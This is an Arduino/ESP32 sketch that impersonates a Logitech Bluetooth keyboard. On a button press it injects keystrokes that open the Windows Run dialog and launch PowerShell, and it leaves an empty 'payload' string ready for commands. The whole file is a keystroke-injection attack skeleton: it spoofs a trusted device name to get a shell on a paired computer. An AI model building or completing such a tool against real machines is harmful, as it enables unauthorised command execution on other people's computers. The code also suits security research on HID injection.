#include <BleKeyboard.h>
#define pin1 2
bool laststate=HIGH;
const char *name="Logitech";
BleKeyboard keyboard(name,"Espressif",100);
bool state1;
void setup() {
   Serial.begin(115200);
   pinMode(pin1,INPUT_PULLUP);
   keyboard.begin();

}

void loop() {
  if(keyboard.isConnected()){
    state1=digitalRead(pin1);
    if(laststate==HIGH && state1==LOW){
      Serial.println("Trigger is running");
      keyboard.press(KEY_LEFT_GUI);
      keyboard.press('r');
      delay(500);
      keyboard.releaseAll();
      delay(1000);
      keyboard.print("powershell.exe");
      delay(100);
      keyboard.press(KEY_RETURN);
      delay(100);
      keyboard.releaseAll();
      delay(1000);
      const char* payload="";

    }
  }
  

}